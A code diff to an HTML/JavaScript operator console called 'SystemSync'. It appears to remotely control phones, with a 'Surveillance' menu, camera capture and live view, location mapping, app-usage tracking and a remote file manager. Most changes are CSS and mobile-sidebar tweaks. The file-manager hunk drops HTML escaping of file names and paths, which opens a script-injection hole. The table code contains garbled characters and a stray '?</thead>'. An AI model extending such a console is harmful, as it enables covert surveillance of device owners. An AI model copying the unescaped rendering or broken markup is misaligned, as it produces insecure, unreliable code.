@@ -13,15 +13,10 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
     
     <style>
-        /* ==================== BASE STYLES ==================== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        /* ==================== RESET & BASE ==================== */
+        * { margin:0; padding:0; box-sizing:border-box; }
 
         body {
-            margin: 0;
             background: #f5f7fa;
             font-family: 'Segoe UI', system-ui, sans-serif;
             display: flex;
@@ -31,121 +26,96 @@
 
         /* ==================== SIDEBAR ==================== */
         #sidebar {
-            width: 280px;
+            width: 260px;
+            min-width: 260px;
             background: white;
             border-right: 1px solid #e0e4e8;
-            padding: 20px;
+            padding: 16px;
             overflow-y: auto;
-            box-shadow: 2px 0 5px rgba(0,0,0,0.02);
-            transition: transform 0.3s ease;
+            overflow-x: hidden;
+            box-shadow: 2px 0 5px rgba(0,0,0,0.04);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
             z-index: 100;
-        }
-
-        /* Responsive: hide sidebar on small screens, show via hamburger */
-        @media (max-width: 768px) {
-            #sidebar {
-                position: fixed;
-                top: 0;
-                left: 0;
-                bottom: 0;
-                transform: translateX(-100%);
-                z-index: 1000;
-                background: white;
-                box-shadow: 2px 0 10px rgba(0,0,0,0.1);
-            }
-            #sidebar.open {
-                transform: translateX(0);
-            }
-            .menu-toggle {
-                display: block;
-                position: fixed;
-                top: 15px;
-                left: 15px;
-                z-index: 1001;
-                background: #1976ff;
-                color: white;
-                border: none;
-                border-radius: 8px;
-                padding: 8px 12px;
-                cursor: pointer;
-                font-size: 18px;
-            }
-        }
-        @media (min-width: 769px) {
-            .menu-toggle {
-                display: none;
-            }
-        }
-
-        .menu-toggle {
-            display: none;
+            transition: transform 0.28s cubic-bezier(.4,0,.2,1);
         }
 
         .logo {
-            font-size: 20px;
-            font-weight: 600;
+            font-size: 18px;
+            font-weight: 700;
             color: #1976ff;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
 
-        .section {
-            margin-bottom: 25px;
+        /* Close button - only visible on mobile */
+        #sidebarCloseBtn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #666;
+            padding: 2px 6px;
+            width: auto;
+            min-width: unset;
         }
+
+        .section { margin-bottom: 20px; }
 
         .section-title {
-            font-size: 12px;
-            font-weight: 600;
+            font-size: 11px;
+            font-weight: 700;
             color: #7b8a9b;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 12px;
+            letter-spacing: 0.8px;
+            margin-bottom: 8px;
         }
 
-        button {
+        /* Sidebar buttons */
+        #sidebar button {
             width: 100%;
-            padding: 10px 12px;
-            margin: 4px 0;
+            padding: 9px 12px;
+            margin: 2px 0;
             background: white;
             color: #1a2634;
-            border: 1px solid #d0d9e2;
+            border: 1px solid #e8edf2;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 13px;
             text-align: left;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.15s;
             display: flex;
             align-items: center;
             gap: 8px;
+            min-width: unset;
         }
 
-        button:hover {
+        #sidebar button:hover {
             background: #1976ff;
             color: white;
             border-color: #1976ff;
+            transform: none;
         }
+
+        #sidebar button span:first-child { font-size: 15px; }
 
         /* ==================== CAMERA PANELS ==================== */
         .camera-panel {
-            background: #f0f2f5;
+            background: #f5f7fa;
             border-radius: 8px;
             padding: 12px;
-            margin: 8px 0;
+            margin: 6px 0;
             display: none;
         }
-
-        .camera-panel.show {
-            display: block;
-        }
-
-        .camera-option {
-            margin: 8px 0;
-        }
-
-        .camera-option label {
-            margin-right: 15px;
-            color: #1a2634;
-        }
-
+        .camera-panel.show { display: block; }
+        .camera-option { margin: 6px 0; font-size: 13px; }
+        .camera-option label { margin-right: 12px; color: #1a2634; }
         .capture-btn, .live-btn {
             background: #1976ff;
             color: white;
@@ -155,33 +125,53 @@
             cursor: pointer;
             width: 100%;
             margin-top: 8px;
+            font-size: 13px;
         }
-
-        .capture-btn:hover, .live-btn:hover {
-            background: #0d5bca;
-        }
-
+        .capture-btn:hover, .live-btn:hover { background: #0d5bca; }
         .live-controls {
             display: flex;
-            gap: 8px;
+            gap: 6px;
             margin-top: 10px;
             flex-wrap: wrap;
         }
-
         .live-controls button {
             flex: 1;
             background: #1976ff;
             color: white;
             border: none;
-            padding: 8px 3px;
+            padding: 7px 3px;
             border-radius: 6px;
             cursor: pointer;
             width: auto;
+            min-width: unset;
+            font-size: 12px;
         }
+        .live-controls button.stop { background: #d32f2f; }
 
-        .live-controls button.stop {
-            background: #d32f2f;
+        /* Alerts badge in sidebar */
+        #alertsBadge {
+            background: #fff3e0;
+            border: 1px solid #ff9800;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 12px;
+            margin-top: 8px;
         }
+        #alertsBadge strong { color: #e65100; }
+        #alertsList { max-height: 120px; overflow-y: auto; margin-top: 6px; }
+        #clearAlertsBtn {
+            margin-top: 6px;
+            font-size: 11px;
+            padding: 3px 8px;
+            background: #ff9800;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: auto;
+            min-width: unset;
+        }
+        .ws-debug { font-size: 10px; color: #aaa; margin-top: 6px; }
 
         /* ==================== MAIN CONTENT ==================== */
         #main {
@@ -193,47 +183,94 @@
         }
 
         #header {
-            height: 60px;
+            height: 56px;
             background: white;
             border-bottom: 1px solid #e0e4e8;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 25px;
+            padding: 0 16px;
             font-weight: 600;
             color: #1a2634;
-            position: relative;
+            flex-shrink: 0;
+            gap: 10px;
+        }
+
+        #header > div:first-child {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 0;
+            flex: 1;
+        }
+
+        /* Hamburger - hidden on desktop, shown on mobile */
+        #menuBtn {
+            display: none;
+            background: none;
+            border: 1px solid #e0e4e8;
+            border-radius: 8px;
+            padding: 6px 10px;
+            font-size: 18px;
+            cursor: pointer;
+            color: #1a2634;
+            flex-shrink: 0;
+            width: auto;
+            min-width: unset;
+        }
+
+        #headerTitle {
+            font-size: 15px;
+            font-weight: 600;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        #serverInfo {
+            font-size: 11px;
+            color: #1976ff;
+            margin-left: 6px;
+            display: none; /* hidden on mobile, shown on desktop */
         }
 
         #status {
-            padding: 6px 16px;
-            border-radius: 30px;
+            padding: 5px 14px;
+            border-radius: 20px;
             background: #e8f0fe;
             color: #1976ff;
             font-weight: 500;
-            cursor: pointer;
+            font-size: 12px;
+            white-space: nowrap;
         }
+        #status.offline { background: #ffebee; color: #c62828; }
 
-        #status.offline {
-            background: #ffebee;
-            color: #c62828;
-        }
-
-        .reconnect-btn {
+        #reconnectBtn {
             background: #1976ff;
             color: white;
             border: none;
-            border-radius: 20px;
-            padding: 5px 15px;
+            border-radius: 16px;
+            padding: 5px 12px;
             font-size: 12px;
             cursor: pointer;
-            margin-left: 10px;
+            white-space: nowrap;
+            width: auto;
+            min-width: unset;
+        }
+
+        /* Header right group */
+        #header > div:last-child {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-shrink: 0;
         }
 
         #content {
             flex: 1;
-            padding: 20px;
+            padding: 16px;
             overflow: auto;
+            min-height: 0;
         }
 
         #main-panel {
@@ -242,19 +279,36 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.05);
             padding: 20px;
             min-height: 100%;
-            position: relative;
+        }
+
+        /* ==================== DOWNLOAD PROGRESS ==================== */
+        #downloadProgress {
+            background: white;
+            border: 1px solid #1976ff;
+            border-radius: 8px;
+            padding: 10px 16px;
+            margin: 0 16px 10px;
+            display: none;
+            font-size: 13px;
+        }
+        #downloadProgress > div:first-child {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+        #progressBar {
+            width: 0%;
+            height: 8px;
+            background: #1976ff;
+            border-radius: 4px;
+            transition: width 0.3s ease;
         }
 
         /* ==================== MAP ==================== */
-        #map {
-            height: 400px;
-            border-radius: 10px;
-        }
-
+        #map { height: 380px; border-radius: 10px; }
         .map-info {
             position: absolute;
-            top: 30px;
-            left: 30px;
+            top: 20px; left: 20px;
             background: rgba(255,255,255,0.95);
             padding: 8px 12px;
             border-radius: 8px;
@@ -262,468 +316,251 @@
             font-size: 13px;
             color: #1a2634;
             z-index: 1000;
-            pointer-events: none;
             border-left: 4px solid #1976ff;
+            pointer-events: none;
         }
 
         /* ==================== TABLES ==================== */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 14px;
-            overflow-x: auto;
-            display: block;
-        }
-
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
         th {
             background: #f8fafd;
             color: #1a2634;
             font-weight: 600;
-            padding: 12px 10px;
+            padding: 10px 8px;
             text-align: left;
             border-bottom: 2px solid #e0e4e8;
+            white-space: nowrap;
         }
-
         td {
-            padding: 10px;
+            padding: 8px;
             border-bottom: 1px solid #eef2f5;
             color: #2c3e50;
             word-break: break-word;
         }
+        tr:hover { background: #f5f9ff; }
 
-        tr:hover {
-            background: #f5f9ff;
-        }
-
-        /* ==================== FILE MANAGER (TREE-VIEW) ==================== */
-        .file-manager {
-            display: flex;
-            flex-direction: column;
-            height: 100%;
-        }
-
+        /* ==================== FILE MANAGER ==================== */
+        .file-manager { display: flex; flex-direction: column; }
         .file-toolbar-sticky {
-            position: sticky;
-            top: 0;
-            background: white;
-            z-index: 100;
-            padding: 12px;
-            border-bottom: 1px solid #eef2f5;
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            position: sticky; top: 0;
+            background: white; z-index: 10;
+            padding: 10px; border-bottom: 1px solid #eef2f5;
+            display: flex; align-items: center; gap: 10px;
         }
-
-        .file-toolbar {
-            display: flex;
-            gap: 12px;
+        .file-path {
+            background: #f0f2f5; padding: 5px 12px; border-radius: 6px;
+            font-size: 12px; font-family: monospace; color: #2c3e50;
+            flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
         }
-
-        .file-toolbar button {
-            width: auto;
-            margin: 0;
-            padding: 8px 16px;
-            font-size: 13px;
-            text-align: center;
-            justify-content: center;
-        }
-
-        .file-toolbar .delete-btn {
-            background: #d32f2f;
-            color: white;
-            border: none;
-        }
-
-        .file-toolbar .delete-btn:hover {
-            background: #b71c1c;
-        }
-
-        .file-toolbar .download-btn {
-            background: #1976ff;
-            color: white;
-            border: none;
-        }
-
-        .tree-content {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px;
-        }
-
-        .tree-root, .nested-tree {
-            list-style: none;
-            padding-left: 24px;
-            margin: 0;
-            position: relative;
-        }
-
+        .tree-content { flex: 1; overflow-y: auto; padding: 12px; }
+        .tree-root, .nested-tree { list-style: none; padding-left: 20px; margin: 0; position: relative; }
         .tree-root::before, .nested-tree::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 8px;
-            width: 1px;
-            height: 100%;
-            background: #d1d9e0;
+            content: ""; position: absolute; top: 0; left: 8px;
+            width: 1px; height: 100%; background: #d1d9e0;
         }
-
-        .tree-item {
-            position: relative;
-            margin: 4px 0;
-        }
-
+        .tree-item { position: relative; margin: 3px 0; }
         .tree-item::before {
-            content: "";
-            position: absolute;
-            top: 15px;
-            left: -16px;
-            width: 16px;
-            height: 1px;
-            background: #d1d9e0;
+            content: ""; position: absolute; top: 14px; left: -14px;
+            width: 14px; height: 1px; background: #d1d9e0;
         }
-
         .folder-header, .file-row {
-            display: flex;
-            align-items: center;
-            padding: 6px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background 0.2s;
+            display: flex; align-items: center; padding: 5px 8px;
+            border-radius: 6px; cursor: pointer; transition: background 0.15s;
         }
-
-        .folder-header:hover, .file-row:hover {
-            background: #f5f7fa;
-        }
-
-        .folder-icon, .file-icon {
-            font-size: 18px;
-            margin-right: 10px;
-            display: inline-block;
-            width: 24px;
-            text-align: center;
-        }
-
-        .item-name {
-            font-size: 14px;
-            color: #2c3e50;
-            flex: 1;
-        }
-
-        .file-size {
-            font-size: 11px;
-            color: #94a3b8;
-            margin-left: 10px;
-        }
-
-        .file-checkbox {
-            width: 16px;
-            height: 16px;
-            margin-right: 10px;
-            cursor: pointer;
-        }
+        .folder-header:hover, .file-row:hover { background: #f5f7fa; }
+        .folder-icon, .file-icon { font-size: 16px; margin-right: 8px; width: 20px; text-align: center; }
+        .item-name { font-size: 13px; color: #2c3e50; flex: 1; }
+        .file-size { font-size: 11px; color: #94a3b8; margin-left: 8px; white-space: nowrap; }
+        .file-checkbox { width: 14px; height: 14px; margin-right: 8px; cursor: pointer; }
+        .nested-tree { max-height: 0; overflow: hidden; opacity: 0; transition: max-height 0.3s ease, opacity 0.3s; }
+        .nested-tree.show { max-height: 2000px; opacity: 1; }
+        .empty-msg { padding: 16px; color: #94a3b8; font-style: italic; font-size: 13px; }
 
         /* ==================== PAGINATION ==================== */
-        .pagination {
-            margin-top: 20px;
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-        }
-
+        .pagination { margin-top: 16px; display: flex; gap: 6px; justify-content: center; flex-wrap: wrap; }
         .page-btn {
-            padding: 6px 12px;
-            border: 1px solid #d0d9e2;
-            background: white;
-            border-radius: 6px;
-            cursor: pointer;
-            color: #1a2634;
+            padding: 5px 10px; border: 1px solid #d0d9e2;
+            background: white; border-radius: 6px; cursor: pointer; color: #1a2634; font-size: 12px;
+            min-width: unset; width: auto;
         }
-
-        .page-btn:hover {
-            background: #1976ff;
-            color: white;
-            border-color: #1976ff;
-        }
+        .page-btn:hover { background: #1976ff; color: white; border-color: #1976ff; }
 
         /* ==================== MODAL / POPUP ==================== */
         .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.9);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
+            position: fixed; inset: 0; background: rgba(0,0,0,0.9);
+            display: none; justify-content: center; align-items: center; z-index: 10000;
         }
-
-        .modal-overlay.show {
-            display: flex;
-        }
-
+        .modal-overlay.show { display: flex; }
         .mobile-popup {
             width: min(92vw, calc(92vh * 9 / 16));
-            height: 92vh;
-            display: flex;
-            flex-direction: column;
-            background: #0f0f0f;
-            border-radius: 26px;
-            border: 6px solid #2e2e2e;
-            box-shadow: 0 40px 120px rgba(0,0,0,0.9);
-            overflow: hidden;
+            height: min(92vh, calc(92vw * 16 / 9));
+            display: flex; flex-direction: column;
+            background: #0f0f0f; border-radius: 20px;
+            border: 4px solid #2e2e2e;
+            box-shadow: 0 32px 100px rgba(0,0,0,0.95); overflow: hidden;
         }
-
         .phone-frame {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: black;
-            overflow: hidden;
-            aspect-ratio: 9 / 16;
+            flex: 1; min-height: 0;
+            display: flex; background: black; overflow: hidden;
         }
-
         .phone-frame video {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            background: black;
+            width: 100%; height: 100%; object-fit: cover; display: block;
         }
-
         .popup-controls {
-            flex-shrink: 0;
-            background: #111;
-            padding: 8px;
-            display: flex;
-            gap: 6px;
-            justify-content: space-around;
-            align-items: center;
-            overflow-x: auto;
+            flex-shrink: 0; background: #111; padding: 10px 12px;
+            display: flex; gap: 8px; justify-content: center; align-items: center;
+            height: 52px; box-sizing: border-box;
         }
-
         .popup-controls button {
-            width: 60px;
-            min-width: 60px;
-            max-width: 60px;
-            height: 28px;
-            min-height: 28px;
-            max-height: 28px;
-            box-sizing: border-box;
-            flex-shrink: 0;
-            font-size: 12px;
-            background: #1e1e1e;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            flex: 0 0 auto; width: 44px; height: 32px;
+            background: #1e1e1e; color: white; border: none;
+            border-radius: 8px; cursor: pointer; font-size: 18px;
+            display: flex; align-items: center; justify-content: center;
+            transition: background 0.15s;
+            min-width: unset;
         }
-
-        .popup-controls button:hover {
-            background: #3a3a3c;
-            transform: scale(1.05);
-        }
-
-        .popup-controls button.close-btn {
-            background: #c0392b;
-        }
-
-        .popup-controls button.fullscreen-btn {
-            background: #3a3a3c;
-        }
-
-        body.modal-open #sidebar,
-        body.modal-open #main {
-            pointer-events: none;
-            filter: blur(4px);
-            transition: filter 0.3s;
+        .popup-controls button:hover { background: #3a3a3c; }
+        .popup-controls button.close-btn { background: #c0392b; width: 52px; }
+        .popup-controls button.fullscreen-btn { background: #3a3a3c; }
+        body.modal-open #sidebar, body.modal-open #main {
+            pointer-events: none; filter: blur(4px); transition: filter 0.3s;
         }
 
         /* ==================== AUTH & DEVICE LIST ==================== */
         #authContainer, #deviceListContainer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: #f5f7fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 20000;
+            position: fixed; inset: 0; background: #f5f7fa;
+            display: flex; justify-content: center; align-items: center; z-index: 20000;
         }
-
         #authBox, #deviceListBox {
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            width: 350px;
-            max-width: 90%;
+            background: white; padding: 28px; border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.12); width: 340px; max-width: 92%;
         }
-
-        #deviceListBox {
-            width: 500px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-
-        #authBox h2, #deviceListBox h2 {
-            margin-top: 0;
-            color: #1976ff;
-        }
-
+        #deviceListBox { width: 480px; max-height: 80vh; overflow-y: auto; }
+        #authBox h2, #deviceListBox h2 { margin-top: 0; color: #1976ff; }
         #authBox input {
-            width: 100%;
-            padding: 10px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            box-sizing: border-box;
+            width: 100%; padding: 10px; margin: 6px 0;
+            border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px;
         }
-
         #authBox button, #logoutBtn {
-            width: 100%;
-            padding: 10px;
-            background: #1976ff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 10px;
+            width: 100%; padding: 10px; background: #1976ff;
+            color: white; border: none; border-radius: 6px;
+            cursor: pointer; font-size: 15px; margin-top: 8px;
+            min-width: unset;
         }
-
-        #logoutBtn {
-            background: #d32f2f;
-            margin-top: 16px;
-        }
-
+        #logoutBtn { background: #d32f2f; margin-top: 14px; }
         .toggle-link {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #1976ff;
-            cursor: pointer;
+            text-align: center; margin-top: 12px; font-size: 13px;
+            color: #1976ff; cursor: pointer;
         }
-
-        .toggle-link:hover {
-            text-decoration: underline;
-        }
-
-        #authError {
-            color: #d32f2f;
-            font-size: 13px;
-            margin-top: 8px;
-        }
-
+        .toggle-link:hover { text-decoration: underline; }
+        #authError { color: #d32f2f; font-size: 13px; margin-top: 6px; }
         .device-item {
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            border: 1px solid #e0e4e8;
-            border-radius: 8px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: background 0.2s;
+            display: flex; align-items: center; padding: 12px;
+            border: 1px solid #e0e4e8; border-radius: 8px; margin-bottom: 8px;
+            cursor: pointer; transition: background 0.2s;
         }
-
-        .device-item:hover {
-            background: #e3f2fd;
-        }
-
-        .device-icon {
-            font-size: 24px;
-            margin-right: 12px;
-        }
-
-        .device-info {
-            flex: 1;
-        }
-
-        .device-name {
-            font-weight: 600;
-            font-size: 16px;
-        }
-
-        .device-id {
-            font-size: 12px;
-            color: #7b8a9b;
-        }
-
-        /* ==================== PROGRESS & DOWNLOAD ==================== */
-        #downloadProgress {
-            background: #fff;
-            border: 1px solid #1976ff;
-            border-radius: 8px;
-            padding: 10px;
-            margin-bottom: 10px;
-            display: none;
-        }
-
-        #progressBar {
-            width: 0%;
-            height: 10px;
-            background: #1976ff;
-            border-radius: 4px;
-            transition: width 0.3s ease;
-        }
+        .device-item:hover { background: #e3f2fd; }
+        .device-icon { font-size: 22px; margin-right: 12px; }
+        .device-info { flex: 1; }
+        .device-name { font-weight: 600; font-size: 15px; }
+        .device-id { font-size: 12px; color: #7b8a9b; }
 
         /* ==================== UTILITIES ==================== */
-        .ws-debug {
-            font-size: 11px;
-            color: #666;
-            margin-top: 6px;
+        .usage-bar { height: 10px; border-radius: 5px; background-color: #1976ff; }
+        .app-usage-item { display: flex; align-items: center; padding: 8px; border-bottom: 1px solid #eef2f5; }
+        .app-usage-name { flex: 1; font-weight: 500; font-size: 13px; }
+        .app-usage-time { width: 80px; text-align: right; color: #666; font-size: 12px; }
+        img, video { max-width: 100%; border-radius: 8px; display: block; margin: 0 auto; }
+        audio { width: 100%; margin-top: 12px; }
+
+        /* ==================== SIDEBAR OVERLAY (mobile backdrop) ==================== */
+        #sidebarOverlay {
             display: none;
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.4);
+            z-index: 99;
         }
 
-        .usage-bar {
-            height: 10px;
-            border-radius: 5px;
-            background-color: #1976ff;
+        /* ==================== INITIALLY HIDDEN (before auth) ==================== */
+        #sidebar, #main { display: none; }
+
+        /* ==================== RESPONSIVE — MOBILE (<= 768px) ==================== */
+        @media (max-width: 768px) {
+            body { overflow: hidden; }
+
+            /* Sidebar slides in as overlay on mobile */
+            #sidebar {
+                position: fixed;
+                top: 0; left: 0; bottom: 0;
+                width: 280px;
+                z-index: 200;
+                transform: translateX(-100%);
+                box-shadow: 4px 0 20px rgba(0,0,0,0.18);
+            }
+
+            /* When open (toggled by JS) */
+            #sidebar.open {
+                transform: translateX(0);
+            }
+
+            /* Show backdrop when sidebar is open */
+            #sidebar.open ~ #sidebarOverlay,
+            #sidebarOverlay.show { display: block; }
+
+            /* Hamburger visible on mobile */
+            #menuBtn { display: flex; }
+
+            /* Close btn inside sidebar */
+            #sidebarCloseBtn { display: flex; }
+
+            /* Hide server info on mobile */
+            #serverInfo { display: none !important; }
+
+            /* Main takes full width */
+            #main { width: 100%; }
+
+            /* Smaller header */
+            #header { padding: 0 12px; height: 52px; }
+            #headerTitle { font-size: 14px; }
+
+            /* Content padding smaller */
+            #content { padding: 10px; }
+            #main-panel { padding: 14px; border-radius: 8px; }
+
+            /* Table on mobile — horizontal scroll */
+            .table-wrapper { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+            table { min-width: 480px; }
+
+            /* Map smaller on mobile */
+            #map { height: 280px; }
+
+            /* Popup smaller on mobile */
+            .mobile-popup {
+                width: 96vw;
+                height: min(94vh, calc(96vw * 16 / 9));
+            }
         }
 
-        .app-usage-item {
-            display: flex;
-            align-items: center;
-            padding: 8px;
-            border-bottom: 1px solid #eef2f5;
-        }
+        /* ==================== RESPONSIVE — DESKTOP (> 768px) ==================== */
+        @media (min-width: 769px) {
+            /* Sidebar always visible on desktop */
+            #sidebar {
+                position: relative;
+                transform: none !important;
+                display: flex !important; /* overrides JS-hidden state after auth */
+            }
 
-        .app-usage-name {
-            flex: 1;
-            font-weight: 500;
-        }
+            /* Hamburger hidden on desktop */
+            #menuBtn { display: none !important; }
+            #sidebarCloseBtn { display: none !important; }
+            #sidebarOverlay { display: none !important; }
 
-        .app-usage-time {
-            width: 80px;
-            text-align: right;
-            color: #666;
-        }
-
-        img, video {
-            max-width: 100%;
-            max-height: 70vh;
-            border-radius: 8px;
-            display: block;
-            margin: 0 auto;
-        }
-
-        audio {
-            width: 100%;
-            margin-top: 15px;
-        }
-
-        /* ==================== HIDE MAIN INTERFACE INITIALLY ==================== */
-        #sidebar, #main {
-            display: none;
+            /* Server info visible on desktop */
+            #serverInfo { display: inline !important; }
         }
     </style>
 </head>
 <body>
-
-<button class="menu-toggle" id="menuToggle">☰</button>
 
 <!-- AUTHENTICATION CONTAINER (login) -->
 <div id="authContainer">
@@ -763,8 +600,11 @@
 </div>
 
 <!-- SIDEBAR -->
+<!-- Mobile overlay backdrop -->
+<div id="sidebarOverlay" onclick="closeSidebar()"></div>
+
 <div id="sidebar">
-    <div class="logo">SystemSync 🔗</div>
+    <div class="logo">SystemSync 🔗 <button id="sidebarCloseBtn" onclick="closeSidebar()" title="Close menu">✕</button></div>
 
     <div class="section">
         <div class="section-title">Surveillance</div>
@@ -848,7 +688,10 @@
 <!-- MAIN CONTENT -->
 <div id="main">
     <div id="header">
-        <div>Control Panel <span id="serverInfo">mirror-view.onrender.com</span></div>
+        <div>
+                <button id="menuBtn" onclick="toggleSidebar()" title="Menu">☰</button>
+                <span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span></span>
+            </div>
         <div>
             <span id="status">CONNECTING</span>
             <button id="reconnectBtn">⟲ Reconnect</button>
@@ -893,6 +736,33 @@
             measurementId: "G-2KW4EJYTRB"
         }
     };
+
+    // ==================== SIDEBAR TOGGLE (MOBILE) ====================
+    function toggleSidebar() {
+        const sb = document.getElementById('sidebar');
+        const ov = document.getElementById('sidebarOverlay');
+        if (sb) sb.classList.toggle('open');
+        if (ov) ov.classList.toggle('show');
+    }
+    function closeSidebar() {
+        const sb = document.getElementById('sidebar');
+        const ov = document.getElementById('sidebarOverlay');
+        if (sb) sb.classList.remove('open');
+        if (ov) ov.classList.remove('show');
+    }
+    // Close sidebar when any sidebar button is clicked (mobile UX)
+    document.addEventListener('click', function(e) {
+        if (window.innerWidth > 768) return;
+        const sb = document.getElementById('sidebar');
+        if (!sb || !sb.classList.contains('open')) return;
+        // If click is on a sidebar button (not the menu/close buttons)
+        if (e.target.closest('#sidebar') && !e.target.closest('#menuBtn') &&
+            !e.target.closest('#sidebarCloseBtn') && e.target.tagName === 'BUTTON') {
+            closeSidebar();
+        }
+    });
+
+
 
     // Firebase initialization
     firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
@@ -1126,8 +996,11 @@
     function selectDevice(deviceId, deviceName) {
         selectedDeviceId = deviceId;
         document.getElementById('deviceListContainer').style.display = 'none';
-        document.getElementById('sidebar').style.display = 'block';
+        // Show main interface (sidebar visibility handled by CSS media queries)
+        document.getElementById('sidebar').style.display = '';
+        document.getElementById('sidebar').style.removeProperty('display');
         document.getElementById('main').style.display = 'flex';
+        // On desktop the sidebar CSS shows it; on mobile it starts hidden (off-canvas)
         document.getElementById('serverInfo').innerText = `Device: ${deviceName || deviceId}`;
         connectWebSocket();
     }
@@ -1518,6 +1391,7 @@
         a.click();
     }
 
+    // FIXED: Added string parsing for location data
     function renderMap(loc) {
         let locationData = loc;
         if (typeof locationData === 'string') {
@@ -1565,9 +1439,9 @@
         const pageSize = 20, total = Math.ceil(rows.length/pageSize);
         const start = currentPage*pageSize;
         const pageRows = rows.slice(start, start+pageSize);
-        let html = '能够<thead>‘ + headers.map(h=>`<th>${h}</th>`).join('') + '?</thead><tbody>';
-        pageRows.forEach(r => { html += '?' + r.map(cell=>`<td>${cell||''}</td>`).join('') + '处'; });
-        html += '</tbody>?</table>';
+        let html = '<table><thead><tr>' + headers.map(h=>`<th>${h}</th>`).join('') + '?</thead><tbody>';
+        pageRows.forEach(r => { html += '<tr>' + r.map(cell=>`<td>${cell||''}</td>`).join('') + '</tr>'; });
+        html += '</tbody></table>';
         if (total>1) {
             html += '<div class="pagination">';
             for (let i=0; i<total; i++) html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
@@ -1578,22 +1452,19 @@
 
     function gotoPage(p) { currentPage = p; renderTable(); }
 
-    // File Manager: sorted, with toolbar buttons and no path display
+    // File Manager – simple list (preserve tree by showing only current folder)
+    // When a folder is clicked, we replace the panel content with new list; the path is updated.
+    // This keeps the structure simple; to maintain a tree you'd need to store expanded state.
     function renderFiles() {
         const panel = document.getElementById('main-panel');
         if (!panel) return;
-
-        // Sort data: folders first (alphabetically), then files (alphabetically)
-        const folders = currentData.filter(i => i.isDir).sort((a,b) => a.name.localeCompare(b.name));
-        const files = currentData.filter(i => !i.isDir).sort((a,b) => a.name.localeCompare(b.name));
 
         let html = `
             <div class="file-manager">
                 <div class="file-toolbar-sticky">
                     <div class="file-toolbar">
-                        <button onclick="navigateUp()" class="up-btn">⬆ Up</button>
-                        <button onclick="downloadSelected()" class="download-btn">⬇️ Download (<span id="downloadCount">${selectedFiles.length}</span>)</button>
-                        <button onclick="deleteSelected()" class="delete-btn">🗑️ Delete (<span id="deleteCount">${selectedFiles.length}</span>)</button>
+                        <button onclick="navigateUp()">⬆ Back</button>
+                        <span class="file-path">${currentPath}</span>
                     </div>
                 </div>
                 <div class="tree-content">
@@ -1601,35 +1472,27 @@
         `;
 
         // Folders
-        folders.forEach(f => {
+        currentData.filter(i => i.isDir).forEach(f => {
             html += `
                 <li class="tree-item">
-                    <div class="folder-header" onclick="handleFolderClick('${escapeHtml(f.path)}')">
+                    <div class="folder-header" onclick="handleFolderClick('${f.path}')">
                         <span class="folder-icon">📁</span>
-                        <span class="item-name">${escapeHtml(f.name)}</span>
+                        <span class="item-name">${f.name}</span>
                     </div>
                 </li>`;
         });
 
-        // Files (with checkboxes for selection)
-        files.forEach(f => {
-            const path = f.path;
-            const name = f.name;
-            const size = formatBytes(f.size);
+        // Files
+        currentData.filter(i => !i.isDir).forEach(f => {
             html += `
                 <li class="tree-item">
                     <div class="file-row">
-                        <input type="checkbox" class="file-checkbox" data-path="${escapeHtml(path)}" onchange="updateSelected(this)">
-                        <span class="file-icon">📄</span>
-                        <span class="item-name">${escapeHtml(name)}</span>
-                        <span class="file-size">${size}</span>
+                        <span class="folder-icon">📄</span>
+                        <span class="item-name">${f.name}</span>
